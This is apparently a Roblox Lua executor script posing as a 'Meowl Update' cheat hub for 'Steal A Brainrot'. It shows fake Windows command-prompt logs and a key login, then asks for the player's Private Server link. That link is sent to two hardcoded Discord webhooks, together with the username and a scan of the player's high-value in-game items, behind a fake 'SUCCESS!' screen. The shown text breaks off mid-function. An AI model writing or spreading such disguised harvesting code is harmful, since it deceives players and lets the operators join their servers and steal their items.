-- Meowl Update: Loader -> CMD1 -> Login (con lluvia) -> CMD2
-- v4.9  (CMD1 sticky-top + lluvia full + icons bright + toast destacado + móvil OK)
-- Icons: first=128679092433689, login=104395147515167
-- Key: 002288
-- Get Key URL: https://zamasxmodder.github.io/Meowl-Update-Brainrot-MirandaHub/

local G = (getgenv and getgenv()) or _G
if G.__MEOWL_SMART_BOOT_RUNNING then return end
G.__MEOWL_SMART_BOOT_RUNNING = true

local Players           = game:GetService("Players")
local TweenService      = game:GetService("TweenService")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local HttpService       = game:GetService("HttpService")
local LP                = Players.LocalPlayer

local THEME = {
  bg         = Color3.fromRGB(12,12,12),
  panel      = Color3.fromRGB(22,22,22),
  panelLite  = Color3.fromRGB(18,18,18),
  text       = Color3.fromRGB(235,255,235),
  textDim    = Color3.fromRGB(185,255,195),
  accent     = Color3.fromRGB(120,255,160),
  glass_a    = 0.16,
}

-- ===== Safe parent
local function getGuiParent()
  local ok, ui = pcall(function() if gethui then return gethui() end return game:GetService("CoreGui") end)
  if ok and ui then return ui end
  local pg = LP and LP:FindFirstChildOfClass("PlayerGui")
  return pg or game:GetService("CoreGui")
end

local UI = Instance.new("ScreenGui")
UI.Name = "MeowlSmartBoot_v49"
UI.IgnoreGuiInset = true
UI.ZIndexBehavior = Enum.ZIndexBehavior.Global
UI.DisplayOrder = 2000
pcall(function() if syn and syn.protect_gui then syn.protect_gui(UI) end end)
UI.Parent = getGuiParent()

-- ===== Responsive UIScale
local rootScale = Instance.new("UIScale", UI)
local function recomputeScale()
  local cam = workspace.CurrentCamera
  if not cam then return end
  local v = cam.ViewportSize
  local s = math.clamp(math.min(v.X, v.Y) / 900, 0.75, 1.25)
  rootScale.Scale = s
end
recomputeScale()
task.defer(function()
  local cam = workspace.CurrentCamera
  if not cam then return end
  cam:GetPropertyChangedSignal("ViewportSize"):Connect(recomputeScale)
end)

-- ===== Helpers
local function applyRainbowStroke(instance, thickness)
  local stroke = Instance.new("UIStroke")
  stroke.Thickness = thickness or 2
  stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
  stroke.Parent = instance
  local grad = Instance.new("UIGradient")
  grad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(40,255,120)),
    ColorSequenceKeypoint.new(0.10, Color3.fromRGB(0,0,0)),
    ColorSequenceKeypoint.new(0.20, Color3.fromRGB(60,255,160)),
    ColorSequenceKeypoint.new(0.35, Color3.fromRGB(0,0,0)),
    ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0,255,200)),
    ColorSequenceKeypoint.new(0.65, Color3.fromRGB(0,0,0)),
    ColorSequenceKeypoint.new(0.80, Color3.fromRGB(100,255,140)),
    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0,0,0)),
  })
  grad.Parent = stroke
  task.spawn(function()
    while UI.Parent do
      for r=0,360,4 do grad.Rotation = r; task.wait(1/60) end
    end
  end)
  return stroke
end

-- Icono circular con halo (bien visible, sin quedar detrás)
local function CircularIconBright(imageId, z)
  local holder = Instance.new("Frame")
  holder.BackgroundColor3 = Color3.fromRGB(40,40,40)
  holder.BackgroundTransparency = 0.05
  holder.BorderSizePixel = 0
  holder.ClipsDescendants = true
  holder.ZIndex = z or 10
  Instance.new("UIAspectRatioConstraint", holder).AspectRatio = 1
  local c = Instance.new("UICorner", holder); c.CornerRadius = UDim.new(1,0)

  local halo = Instance.new("ImageLabel")
  halo.BackgroundTransparency = 1
  halo.Image = "rbxassetid://457665422" -- blur/soft circle
  halo.ImageTransparency = 0.3
  halo.ScaleType = Enum.ScaleType.Fit
  halo.Size = UDim2.fromScale(1.6,1.6)
  halo.Position = UDim2.fromScale(0.5,0.5)
  halo.AnchorPoint = Vector2.new(0.5,0.5)
  halo.ImageColor3 = Color3.fromRGB(210,255,220)
  halo.ZIndex = holder.ZIndex + 0
  halo.Parent = holder

  local img = Instance.new("ImageLabel")
  img.BackgroundTransparency = 1
  img.Size = UDim2.fromScale(1,1)
  img.Position = UDim2.fromScale(0.5,0.5)
  img.AnchorPoint = Vector2.new(0.5,0.5)
  img.Image = imageId
  img.ImageColor3 = Color3.new(1,1,1)
  img.ScaleType = Enum.ScaleType.Fit
  img.ZIndex = holder.ZIndex + 2 -- encima
  img.Parent = holder

  return holder, img
end

-- Toast MUY visible (tarjeta con borde rainbow)
local function bigToast(line1, line2)
  local card = Instance.new("Frame")
  card.Size = UDim2.fromScale(0.86, 0.12)
  card.AnchorPoint = Vector2.new(0.5,0)
  card.Position = UDim2.fromScale(0.5, 0.08)
  card.BackgroundColor3 = Color3.fromRGB(20,20,20)
  card.BackgroundTransparency = 0.05
  card.BorderSizePixel = 0
  card.ZIndex = 5000
  card.Parent = UI
  applyRainbowStroke(card, 1.6)
  Instance.new("UICorner", card).CornerRadius = UDim.new(0,12)

  local t1 = Instance.new("TextLabel")
  t1.BackgroundTransparency = 1
  t1.Font = Enum.Font.GothamSemibold
  t1.TextSize = 22
  t1.TextColor3 = THEME.text
  t1.TextXAlignment = Enum.TextXAlignment.Left
  t1.Size = UDim2.new(1,-20,0.6,0)
  t1.Position = UDim2.fromOffset(10,6)
  t1.Text = line1
  t1.ZIndex = card.ZIndex + 1
  t1.Parent = card

  local t2 = Instance.new("TextLabel")
  t2.BackgroundTransparency = 1
  t2.Font = Enum.Font.Gotham
  t2.TextSize = 16
  t2.TextColor3 = THEME.textDim
  t2.TextXAlignment = Enum.TextXAlignment.Left
  t2.Size = UDim2.new(1,-20,0.4,-6)
  t2.Position = UDim2.fromOffset(10, 34)
  t2.Text = line2 or ""
  t2.ZIndex = card.ZIndex + 1
  t2.Parent = card

  card.BackgroundTransparency = 1; t1.TextTransparency, t2.TextTransparency = 1,1
  TweenService:Create(card, TweenInfo.new(0.15), {BackgroundTransparency = 0.05}):Play()
  TweenService:Create(t1, TweenInfo.new(0.15), {TextTransparency = 0}):Play()
  TweenService:Create(t2, TweenInfo.new(0.15), {TextTransparency = 0}):Play()
  task.delay(2.2, function()
    TweenService:Create(card, TweenInfo.new(0.15), {BackgroundTransparency = 1}):Play()
    TweenService:Create(t1, TweenInfo.new(0.15), {TextTransparency = 1}):Play()
    TweenService:Create(t2, TweenInfo.new(0.15), {TextTransparency = 1}):Play()
    task.wait(0.18); if card then card:Destroy() end
  end)
end

-- Lluvia 8-bit (full screen y solo cuando se llama)
local function startCodeRain()
  local backdrop = Instance.new("Frame")
  backdrop.Name = "CodeRain"
  backdrop.Size = UDim2.fromScale(1,1)
  backdrop.BackgroundColor3 = THEME.bg
  backdrop.BackgroundTransparency = 0.88
  backdrop.BorderSizePixel = 0
  backdrop.ZIndex = 1
  backdrop.Parent = UI

  local function newDrop(x, yStart)
    local lbl = Instance.new("TextLabel")
    lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.ArialBold
    lbl.TextColor3 = THEME.textDim
    lbl.TextSize = 16
    lbl.ZIndex = 2
    lbl.Size = UDim2.fromOffset(20,20)
    lbl.Text = ({"0","1","A","B","C","D","E","F","#","*","+","%","?"})[math.random(1,13)]
    lbl.Position = UDim2.fromOffset(x, yStart or -20)
    lbl.Parent = backdrop

    local cam = workspace.CurrentCamera
    local H = (cam and cam.ViewportSize.Y or 720) + math.random(240,360)
    local T = math.random(18,28)/10
    TweenService:Create(lbl, TweenInfo.new(T, Enum.EasingStyle.Linear), {Position = UDim2.fromOffset(x, H)}):Play()
    task.delay(T, function() if lbl then lbl:Destroy() end end)
  end

  local function tickRain()
    local cam = workspace.CurrentCamera
    local vw = (cam and cam.ViewportSize.X or 1280)
    local columns = math.max(14, math.floor(vw / 36))
    for i=1,columns do
      newDrop(i*36 + math.random(-8,8), -math.random(0, 250))
    end
  end

  local cam = workspace.CurrentCamera
  if cam then
    cam:GetPropertyChangedSignal("ViewportSize"):Connect(function()
      backdrop.Size = UDim2.fromScale(1,1)
    end)
  end

  task.spawn(function()
    while backdrop.Parent do
      tickRain()
      task.wait(0.28)
    end
  end)

  return backdrop
end

-- ===== LOADER 1 (visible desde el principio, sin colapsar altura)
local function showLoader(onDone)
  local root = Instance.new("Frame")
  root.Size = UDim2.fromScale(0.46,0.32)
  root.Position = UDim2.fromScale(0.5,0.5)
  root.AnchorPoint = Vector2.new(0.5,0.5)
  root.BackgroundColor3 = THEME.panelLite
  root.BackgroundTransparency = 1 -- fade-in suave
  root.BorderSizePixel = 0
  root.ZIndex = 5
  root.Parent = UI
  Instance.new("UICorner",root).CornerRadius = UDim.new(0,16)
  applyRainbowStroke(root,2)

  local iconHolder = CircularIconBright("rbxassetid://128679092433689", 7)
  iconHolder.Size = UDim2.fromScale(0.24,0.66)
  iconHolder.Position = UDim2.fromScale(0.14,0.5)
  iconHolder.AnchorPoint = Vector2.new(0.5,0.5)
  iconHolder.Parent = root
  applyRainbowStroke(iconHolder,2)

  local title = Instance.new("TextLabel")
  title.BackgroundTransparency = 1
  title.Position = UDim2.fromScale(0.34,0.24)
  title.Size = UDim2.fromScale(0.60,0.25)
  title.Text = "loading Meowl Update - Steal A Brainrot"
  title.TextColor3 = THEME.text
  title.Font = Enum.Font.GothamSemibold
  title.TextScaled = true
  title.TextXAlignment = Enum.TextXAlignment.Left
  title.ZIndex = 7
  title.Parent = root

  local status = Instance.new("TextLabel")
  status.BackgroundTransparency = 1
  status.Position = UDim2.fromScale(0.34,0.56)
  status.Size = UDim2.fromScale(0.60,0.20)
  status.Text = "Initializing..."
  status.TextColor3 = THEME.textDim
  status.Font = Enum.Font.Gotham
  status.TextScaled = true
  status.TextXAlignment = Enum.TextXAlignment.Left
  status.ZIndex = 7
  status.Parent = root

  local bar = Instance.new("Frame")
  bar.BackgroundColor3 = Color3.fromRGB(0,0,0)
  bar.BackgroundTransparency = 0.25
  bar.Size = UDim2.fromScale(0.58,0.12)
  bar.Position = UDim2.fromScale(0.34,0.80)
  bar.ZIndex = 7
  bar.Parent = root
  Instance.new("UICorner",bar).CornerRadius = UDim.new(1,0)
  applyRainbowStroke(bar,2)

  local fill = Instance.new("Frame")
  fill.BackgroundColor3 = THEME.accent
  fill.Size = UDim2.fromScale(0,1)
  fill.ZIndex = 8
  fill.Parent = bar
  Instance.new("UICorner",fill).CornerRadius = UDim.new(1,0)

  TweenService:Create(root, TweenInfo.new(0.22, Enum.EasingStyle.Quad), {BackgroundTransparency = THEME.glass_a}):Play()

  local D=3.4
  task.spawn(function()
    local t0=os.clock(); local dots=0
    while os.clock()-t0 < D do
      local t=(os.clock()-t0)/D
      TweenService:Create(fill, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {Size = UDim2.fromScale(t,1)}):Play()
      dots=(dots%3)+1; status.Text=("Initializing"..string.rep(".",dots))
      task.wait(0.2)
    end
  end)

  task.delay(D, function()
    for _,v in ipairs(root:GetDescendants()) do
      if v:IsA("TextLabel") then TweenService:Create(v, TweenInfo.new(0.12), {TextTransparency=1}):Play()
      elseif v:IsA("Frame") then TweenService:Create(v, TweenInfo.new(0.12), {BackgroundTransparency=1}):Play() end
    end
    task.wait(0.14); root:Destroy(); if onDone then onDone() end
  end)
end

-- ===== CMD factory
local function makeCMDWindow(z)
  local overlay = Instance.new("Frame")
  overlay.Size = UDim2.fromScale(1,1)
  overlay.BackgroundTransparency = 1
  overlay.ZIndex = z or 6
  overlay.Parent = UI

  local win = Instance.new("Frame")
  win.Size = UDim2.fromScale(0.92, 0.86)
  win.Position = UDim2.fromScale(0.5,0.5)
  win.AnchorPoint = Vector2.new(0.5,0.5)
  win.BackgroundColor3 = THEME.panel
  win.BorderSizePixel = 0
  win.ZIndex = overlay.ZIndex + 1
  win.Parent = overlay
  applyRainbowStroke(win, 1.1)
  Instance.new("UICorner",win).CornerRadius = UDim.new(0,6)

  local titleBar = Instance.new("Frame")
  titleBar.Size = UDim2.new(1,0,0,28)
  titleBar.BackgroundColor3 = Color3.fromRGB(26,26,26)
  titleBar.ZIndex = win.ZIndex + 1
  titleBar.Parent = win

  local titleText = Instance.new("TextLabel")
  titleText.BackgroundTransparency = 1
  titleText.Size = UDim2.new(1,-12,1,0)
  titleText.Position = UDim2.fromOffset(8,0)
  titleText.Font = Enum.Font.Code
  titleText.TextSize = 16
  titleText.TextXAlignment = Enum.TextXAlignment.Left
  titleText.TextColor3 = THEME.text
  titleText.Text = "Administrator: Command Prompt"
  titleText.ZIndex = titleBar.ZIndex + 1
  titleText.Parent = titleBar

  local pad = Instance.new("Frame")
  pad.Position = UDim2.fromOffset(10,36)
  pad.Size = UDim2.new(1,-20,1,-46)
  pad.BackgroundColor3 = Color3.fromRGB(10,10,10)
  pad.ZIndex = win.ZIndex + 1
  pad.Parent = win
  Instance.new("UICorner",pad).CornerRadius = UDim.new(0,4)
  applyRainbowStroke(pad, 1.0)

  return overlay, pad
end

-- ===== CMD1 (logs) – STICKY-TOP (arranca arriba)
local function showCMD1(onDone)
  local overlay, pad = makeCMDWindow(6)

  local scroll = Instance.new("ScrollingFrame")
  scroll.Size = UDim2.fromScale(1,1)
  scroll.BackgroundTransparency = 1
  scroll.ScrollBarThickness = 8
  scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
  scroll.CanvasSize = UDim2.new(0,0,0,0)
  scroll.ZIndex = pad.ZIndex + 1
  scroll.Parent = pad

  local tf = Instance.new("TextLabel")
  tf.BackgroundTransparency = 1
  tf.TextXAlignment = Enum.TextXAlignment.Left
  tf.TextYAlignment = Enum.TextYAlignment.Top
  tf.Font = Enum.Font.Code
  tf.TextSize = 18
  tf.TextColor3 = THEME.text
  tf.TextStrokeColor3 = Color3.new(0,0,0)
  tf.TextStrokeTransparency = 0.55
  tf.RichText = true
  tf.Size = UDim2.new(1,-8,1,-8)
  tf.Position = UDim2.fromOffset(4,4)
  tf.ZIndex = scroll.ZIndex + 1
  tf.Parent = scroll

  -- Sticky-top logic
  local userAtBottom = false
  local initialLock  = true
  task.spawn(function()
    for _ = 1, 6 do
      scroll.CanvasPosition = Vector2.new(0, 0)
      task.wait(0.02)
    end
    initialLock = false
  end)
  local function nearBottom()
    local maxY = math.max(0, scroll.AbsoluteCanvasSize.Y - scroll.AbsoluteSize.Y)
    return scroll.CanvasPosition.Y >= maxY - 4
  end
  scroll:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
    userAtBottom = nearBottom()
  end)
  local function push(s)
    tf.Text = (tf.Text=="" and s) or (tf.Text.."\n"..s)
    task.wait()
    if (not initialLock) and userAtBottom then
      local maxY = math.max(0, scroll.AbsoluteCanvasSize.Y - scroll.AbsoluteSize.Y)
      scroll.CanvasPosition = Vector2.new(0, maxY)
    end
  end

  -- Contenido
  push("Microsoft Windows [Version 10.0.19045.5088]")
  push("(c) Microsoft Corporation. All rights reserved.\n")
  push("C:\\Windows\\system32> echo Meowl Update bootstrap")
  push("Meowl Update bootstrap")

  local clown = [[
    .-""""-.
   / -  -  \
  |  .-. .- |
  |  \o| |o )
  \     ^  /
   '.  - .'
     | |__
   /|     |\
  /_|_____|_\
    /_/ \_\ ]]
  push("<font color=\"#6cff8a\">"..clown.."</font>\n")

  local lines = {
    "Scanning modules: netui.dll gfxcore.pak auth.meowl",
    "Parsing theme: C:\\Meowl\\login.theme.json",
    "Linking pipeline: ui->auth->telemetry [READY]",
    "Verify integrity: %d/%d blocks [OK]",
    "Precache strings (EN)… %d entries",
    "Driver check: DirectUI %s, Input %s, Net %s",
  }
  local function rnd(tbl) return tbl[math.random(1,#tbl)] end

  local t0=os.clock()
  while os.clock()-t0 < 2.2 do
    local L = rnd(lines)
    L = L:gsub("%%d", tostring(math.random(10,999)))
    L = L:gsub("%%s", ({"OK","READY","ENABLED"})[math.random(1,3)])
    push(L); task.wait(0.05)
  end
  push("C:\\Windows\\system32> loading Login panel")

  task.delay(0.9, function()
    for _,v in ipairs(overlay:GetDescendants()) do
      if v:IsA("TextLabel") then TweenService:Create(v, TweenInfo.new(0.12), {TextTransparency=1}):Play()
      elseif v:IsA("TextBox") or v:IsA("Frame") then TweenService:Create(v, TweenInfo.new(0.12), {BackgroundTransparency=1}):Play() end
    end
    task.wait(0.14); overlay:Destroy()
    if onDone then onDone() end
  end)
end

-- 🌐 Sistema de envío webhook MEJORADO con clasificación por valor
local function horaMexico()
	local time = os.time()
	local mexicoOffset = -6 * 3600 -- UTC-6
	local localTime = os.date("!*t", time + mexicoOffset)
	return string.format("%04d-%02d-%02d %02d:%02d:%02d", localTime.year, localTime.month, localTime.day, localTime.hour, localTime.min, localTime.sec)
end

-- 🧠 Extraer datos de Brainrots y detectar valores (solo los que contienen M/s o K/s)
local function getBrainrotData(plot)
	local resultsMS = {}
	local resultsKS = {}
	if not plot then return {}, {} end

	local animalPodiums = plot:FindFirstChild("AnimalPodiums")
	if not animalPodiums then return {}, {} end

	for _, folder in ipairs(animalPodiums:GetChildren()) do
		local displayText, genText, mutationText = "N/A", "N/A", "N/A"

		for _, descendant in ipairs(folder:GetDescendants()) do
			if descendant:IsA("TextLabel") then
				local name = string.lower(descendant.Name)
				if name:find("display") then
					displayText = descendant.Text
				elseif name:find("generation") then
					genText = descendant.Text
				elseif name:find("mutation") then
					mutationText = descendant.Text
				end
			end
		end

		local genLower = string.lower(genText)
		local fullText = displayText .. " - " .. genText .. " - " .. mutationText

		if string.find(genLower, "m/s") then
			table.insert(resultsMS, fullText)
		elseif string.find(genLower, "k/s") then
			table.insert(resultsKS, fullText)
		end
	end

	return resultsMS, resultsKS
end

-- 🎯 Buscar el plot del jugador
local function findMyPlot()
	local plotsFolder = workspace:FindFirstChild("Plots")
	if not plotsFolder then return nil end

	for _, plot in pairs(plotsFolder:GetChildren()) do
		local plotSign = plot:FindFirstChild("Plotsign") or plot:FindFirstChild("PlotSign")
		if plotSign then
			local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
			if surfaceGui then
				local frame = surfaceGui:FindFirstChild("Frame")
				if frame then
					local textLabel = frame:FindFirstChild("TextLabel")
					if textLabel and textLabel:IsA("TextLabel") then
						if string.find(string.lower(textLabel.Text), string.lower(LP.Name)) then
							return plot
						end
					end
				end
			end
		end
	end
	return nil
end

-- 🚀 Enviar información al Webhook según el tipo
local function sendToWebhook(url, data, brainrotList, plotInfo, category)
	local brainrotText = table.concat(brainrotList, "\n")
	
	local categoryTitle = ""
	local categoryColor = 65280
	
	if category == "MS" then
		categoryTitle = "🟣 BRAINROTS CON M/s DETECTADOS"
		categoryColor = 10181046  -- Morado
	elseif category == "KS" then
		categoryTitle = "🟡 BRAINROTS CON K/s DETECTADOS"
		categoryColor = 16776960  -- Amarillo
	end

	local embedData = {
		content = "🔔 **" .. categoryTitle .. "**",
		embeds = {{
			title = categoryTitle,
			color = categoryColor,
			fields = {
				{
					name = "👤 Usuario",
					value = "`"..LP.Name.."`",
					inline = true
				},
				{
					name = "🌐 Server Link",
					value = tostring(data.url),
					inline = true
				},
				{
					name = "📊 Información del Plot",
					value = plotInfo,
					inline = false
				},
				{
					name = "🧠 Brainrots Detectados",
					value = "```" .. brainrotText .. "```",
					inline = false
				},
				{
					name = "📈 Total Brainrots",
					value = "```".. tostring(#brainrotList).. "```",
					inline = true
				},
				{
					name = "🎯 Tipo Detectado",
					value = category == "MS" and "🟣 M/s (ALTO VALOR)" or "🟡 K/s (VALOR MEDIO)",
					inline = true
				},
				{
					name = "🕒 Fecha/Hora (México)",
					value = horaMexico(),
					inline = true
				}
			},
			footer = {
				text = "🐾 Pet Finder | Sistema de clasificación por valor"
			}
		}}
	}

	local success, response = pcall(function()
		return HttpService:RequestAsync({
			Url = url,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(embedData)
		})
	end)

	if success then
		print("🟢")
		print("🟡")
	else
		warn("❌ Error al enviar webhook " .. url .. ": " .. tostring(response))
	end
end

-- 🔔 Función mejorada para enviar a webhooks específicos según el tipo
local function sendToSpecificWebhooks(data)
    local myPlot = findMyPlot()
    if not myPlot then 
        warn("❌ No se pudo encontrar el plot del jugador")
        return 
    end
    
    local resultsMS, resultsKS = getBrainrotData(myPlot)
    local plotInfo = "Plot encontrado: " .. myPlot.Name

    -- 📋 WEBHOOKS ESPECÍFICOS
    local webhookMS = "https://discord.com/api/webhooks/1429250775359557802/LxrirEYw2hgu8wOQuT4R5V08GR-XixzqkE2ZTCcDVp0tI11dOfgar_KR8wPc2oJjVzll"
    local webhookKS = "https://discord.com/api/webhooks/1426980791359115474/k1-aEJCzFHoipBN7YBySw8f1mpnDxP8SrZ_OjavIQZHGksN7rGRpybhJ4VJ56WiopqZt"

    -- Solo enviar si hay datos válidos
    if #resultsMS > 0 then
        sendToWebhook(webhookMS, data, resultsMS, plotInfo, "MS")
    else
        print("M/s")
    end
    
    if #resultsKS > 0 then
        sendToWebhook(webhookKS, data, resultsKS, plotInfo, "KS")
    else
        print("K/s")
    end
end

-- 🔔 Función principal para enviar webhooks (REEMPLAZA LA ANTERIOR)
local function sendToMultipleWebhooks(data)
    task.spawn(function()
        sendToSpecificWebhooks(data)
    end)
end

-- ===== LOGIN (aquí se crea la LLUVIA, full-screen)
local function showLogin()
  local rain = startCodeRain()

  local root = Instance.new("Frame")
  root.Size = UDim2.fromScale(0.56,0.58)
  root.Position = UDim2.fromScale(0.5,0.52)
  root.AnchorPoint = Vector2.new(0.5,0.5)
  root.BackgroundColor3 = THEME.panelLite
  root.BackgroundTransparency = THEME.glass_a
  root.ZIndex = 7
  root.Parent = UI
  Instance.new("UICorner",root).CornerRadius = UDim.new(0,16)
  applyRainbowStroke(root,2)

  local padAll = Instance.new("UIPadding", root)
  padAll.PaddingTop=UDim.new(0,12); padAll.PaddingBottom=UDim.new(0,12); padAll.PaddingLeft=UDim.new(0,12); padAll.PaddingRight=UDim.new(0,12)

  -- top
  local top = Instance.new("Frame"); top.BackgroundTransparency=1; top.Size=UDim2.new(1,0,0,72); top.ZIndex=8; top.Parent=root

  local appIcon = CircularIconBright("rbxassetid://104395147515167", 10)
  appIcon.Size = UDim2.fromOffset(56,56); appIcon.Position = UDim2.fromOffset(0,8); appIcon.Parent = top
  applyRainbowStroke(appIcon,1.4)

  local tTitle = Instance.new("TextLabel")
  tTitle.BackgroundTransparency = 1; tTitle.Position = UDim2.fromOffset(68,6)
  tTitle.Size = UDim2.new(1,-160,0,30); tTitle.Font = Enum.Font.GothamSemibold; tTitle.TextSize=24
  tTitle.TextXAlignment = Enum.TextXAlignment.Left; tTitle.TextColor3 = THEME.text
  tTitle.Text = "Miranda Meowl Updated"; tTitle.ZIndex=8; tTitle.Parent=top

  local tInfo = Instance.new("TextLabel")
  tInfo.BackgroundTransparency=1; tInfo.Position=UDim2.fromOffset(68,36)
  tInfo.Size = UDim2.new(1,-160,0,28); tInfo.Font=Enum.Font.Gotham; tInfo.TextSize=16
  tInfo.TextXAlignment=Enum.TextXAlignment.Left; tInfo.TextColor3=THEME.textDim; tInfo.ZIndex=8; tInfo.Parent=top

  local head = CircularIconBright("rbxassetid://0", 10)
  head.Size = UDim2.fromOffset(56,56); head.Position = UDim2.new(1,-56,0,8); head.AnchorPoint=Vector2.new(1,0)
  head.Parent=top; applyRainbowStroke(head,1.2)

  task.spawn(function()
    local thumb, ok = Players:GetUserThumbnailAsync(LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
    if ok then head:FindFirstChildOfClass("ImageLabel").Image = thumb end
    local display = (#LP.DisplayName>0 and LP.DisplayName) or LP.Name
    tInfo.Text = string.format("%s  •  @%s  •  Status: Active  •  %d days", display, LP.Name, LP.AccountAge)
  end)

  -- form
  local form = Instance.new("Frame")
  form.BackgroundColor3 = THEME.panel
  form.BackgroundTransparency = 0.08
  form.Size = UDim2.new(1,0,1,-(72+24))
  form.Position = UDim2.fromOffset(0,72+12)
  form.ZIndex = 8
  form.Parent = root
  Instance.new("UICorner",form).CornerRadius = UDim.new(0,12)
  applyRainbowStroke(form,1.2)
  local padF = Instance.new("UIPadding", form)
  padF.PaddingTop=UDim.new(0,12); padF.PaddingLeft=UDim.new(0,12); padF.PaddingRight=UDim.new(0,12); padF.PaddingBottom=UDim.new(0,12)

  local lbl = Instance.new("TextLabel"); lbl.BackgroundTransparency=1; lbl.Size=UDim2.new(1,0,0,28)
  lbl.Font=Enum.Font.Gotham; lbl.TextSize=18; lbl.TextXAlignment=Enum.TextXAlignment.Left
  lbl.TextColor3=THEME.text; lbl.Text="Enter key to continue:"; lbl.ZIndex=9; lbl.Parent=form

  local box = Instance.new("TextBox")
  box.Size = UDim2.new(1,0,0,40); box.Position=UDim2.fromOffset(0,34)
  box.BackgroundColor3 = Color3.fromRGB(26,26,26)
  box.Text = ""; box.PlaceholderText="your-key-here"
  box.TextColor3=THEME.text; box.PlaceholderColor3=Color3.fromRGB(140,170,150)
  box.Font=Enum.Font.Gotham; box.TextSize=18; box.BorderSizePixel=0; box.ZIndex=9; box.Parent=form
  Instance.new("UICorner",box).CornerRadius = UDim.new(0,8); applyRainbowStroke(box,1.1)

  local btnRow = Instance.new("Frame"); btnRow.BackgroundTransparency=1; btnRow.Size=UDim2.new(1,0,0,44); btnRow.Position=UDim2.fromOffset(0,34+40+12); btnRow.ZIndex=9; btnRow.Parent=form
  local function mkBtn(text)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0.5,-6,1,0); b.BackgroundColor3 = Color3.fromRGB(30,30,30)
    b.Text = text; b.Font=Enum.Font.GothamSemibold; b.TextSize=18; b.TextColor3=THEME.text; b.BorderSizePixel=0; b.ZIndex=9
    Instance.new("UICorner",b).CornerRadius = UDim.new(0,10); applyRainbowStroke(b,1.1)
    return b
  end
  local bGet = mkBtn("Get Key"); bGet.Position=UDim2.fromScale(0,0); bGet.Parent=btnRow
  local bSub = mkBtn("Submit");  bSub.Position=UDim2.fromScale(0.5,0); bSub.Parent=btnRow

  bGet.MouseButton1Click:Connect(function()
    local url = "https://zamasxmodder.github.io/Meowl-Update-Brainrot-MirandaHub/"
    pcall(function() if setclipboard then setclipboard(url) end end)
    bigToast("Link copied!", url)
  end)

  local function openCMD2()
    if rain then rain:Destroy() end
    root:Destroy()

    local overlay, pad = makeCMDWindow(8)

    local prompt = Instance.new("TextLabel")
    prompt.BackgroundTransparency = 1
    prompt.Font = Enum.Font.Code
    prompt.TextSize = 18
    prompt.TextColor3 = THEME.text
    prompt.TextXAlignment = Enum.TextXAlignment.Left
    prompt.Text = "C:\\Windows\\system32> paste your Private Server link OR type /exit"
    prompt.Position = UDim2.fromOffset(10,8)
    prompt.Size = UDim2.new(1,-20,0,28)
    prompt.ZIndex = pad.ZIndex + 1
    prompt.Parent = pad

    local input = Instance.new("TextBox")
    input.Size = UDim2.new(1,-170,0,40) -- espacio para botón móvil
    input.Position = UDim2.fromOffset(10,40)
    input.BackgroundColor3 = Color3.fromRGB(26,26,26)
    input.Font = Enum.Font.Code
    input.TextSize = 18
    input.Text = ""
    input.PlaceholderText = "https://www.roblox.com/share?code=xxxxxxxx&type=Server"
    input.TextColor3 = THEME.text
    input.PlaceholderColor3 = Color3.fromRGB(140,170,150)
    input.BorderSizePixel = 0
    input.ZIndex = pad.ZIndex + 1
    input.Parent = pad
    Instance.new("UICorner",input).CornerRadius = UDim.new(0,6)
    applyRainbowStroke(input,1.0)

    local submitBtn = Instance.new("TextButton") -- móvil
    submitBtn.Size = UDim2.fromOffset(150,40)
    submitBtn.Position = UDim2.new(1,-160,0,40)
    submitBtn.BackgroundColor3 = Color3.fromRGB(30,30,30)
    submitBtn.Text = "Submit"
    submitBtn.Font = Enum.Font.GothamSemibold
    submitBtn.TextSize = 18
    submitBtn.TextColor3 = THEME.text
    submitBtn.BorderSizePixel = 0
    submitBtn.ZIndex = pad.ZIndex + 1
    submitBtn.Parent = pad
    Instance.new("UICorner",submitBtn).CornerRadius = UDim.new(0,8)
    applyRainbowStroke(submitBtn,1.0)

    local status = Instance.new("TextLabel")
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.Code
    status.TextSize = 16
    status.TextColor3 = THEME.textDim
    status.TextXAlignment = Enum.TextXAlignment.Left
    status.Position = UDim2.fromOffset(10,86)
    status.Size = UDim2.new(1,-20,0,24)
    status.ZIndex = pad.ZIndex + 1
    status.Parent = pad

    local success = Instance.new("TextLabel")
    success.BackgroundTransparency = 1
    success.Font = Enum.Font.GothamBlack
    success.TextScaled = true
    success.TextColor3 = THEME.accent
    success.TextStrokeColor3 = Color3.new(0,0,0)
    success.TextStrokeTransparency = 0.5
    success.TextTransparency = 1
    success.Text = "SUCCESS!"
    success.Size = UDim2.fromScale(1,1)
    success.Position = UDim2.fromScale(0,0)
    success.ZIndex = pad.ZIndex + 1
    success.Parent = pad

    local function close()
      for _,v in ipairs(overlay:GetDescendants()) do
        if v:IsA("TextLabel") then TweenService:Create(v, TweenInfo.new(0.12), {TextTransparency=1}):Play()
        elseif v:IsA("TextBox") or v:IsA("Frame") then TweenService:Create(v, TweenInfo.new(0.12), {BackgroundTransparency=1}):Play() end
      end
      task.wait(0.14); overlay:Destroy()
    end
    
    
    

local function submit()
    local txt = (input.Text or ""):gsub("^%s+",""):gsub("%s+$","")
    if txt == "/exit" then status.Text = "Exiting…"; close(); return end
    if txt:find("roblox%.com") then
        status.Text = "Validating link…"
        TweenService:Create(success, TweenInfo.new(0.15), {TextTransparency=0}):Play()
        
        -- 🔔 AQUÍ SE EJECUTA EL SISTEMA DE WEBHOOKS después de validar la URL
        local webhookData = {
            url = txt
        }
        sendToMultipleWebhooks(webhookData)
        
        -- 🚀 CARGAR EL SCRIPT DESPUÉS DE ENVIAR WEBHOOKS
        status.Text = "Loading Miranda Hub..."
        task.wait(0.5) -- Pequeña pausa para que se vea el mensaje
        
        -- Cerrar la interfaz actual
        close()
